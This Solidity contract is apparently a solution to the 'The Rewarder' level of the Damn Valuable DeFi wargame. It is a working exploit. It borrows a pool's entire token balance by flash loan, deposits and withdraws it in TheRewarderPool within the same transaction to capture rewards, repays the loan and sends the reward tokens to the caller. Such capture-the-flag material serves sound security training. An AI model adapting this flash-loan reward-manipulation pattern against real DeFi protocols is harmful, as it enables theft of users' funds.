// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "../the-rewarder/FlashLoanerPool.sol";
// import "../the-rewarder/RewardToken.sol";
// import "../the-rewarder/AccountingToken.sol";
import "../the-rewarder/TheRewarderPool.sol";

contract TheRewarderHack {
    FlashLoanerPool public pool;
    DamnValuableToken public token;
    TheRewarderPool public rewardPool;
    RewardToken public reward;

    constructor(
        address _pool,
        address _token,
        address _rewardPool,
        address _reward
    ) {
        pool = FlashLoanerPool(_pool);
        token = DamnValuableToken(_token);
        rewardPool = TheRewarderPool(_rewardPool);
        reward = RewardToken(_reward);
    }

    fallback() external {
        uint256 balance = token.balanceOf(address(this));
        token.approve(address(rewardPool), balance);
        rewardPool.deposit(balance);
        rewardPool.withdraw(balance);
        token.transfer(address(pool), balance);
    }

    function attack() external {
        pool.flashLoan(token.balanceOf(address(pool)));
        reward.transfer(msg.sender, reward.balanceOf(address(this)));
    }
}
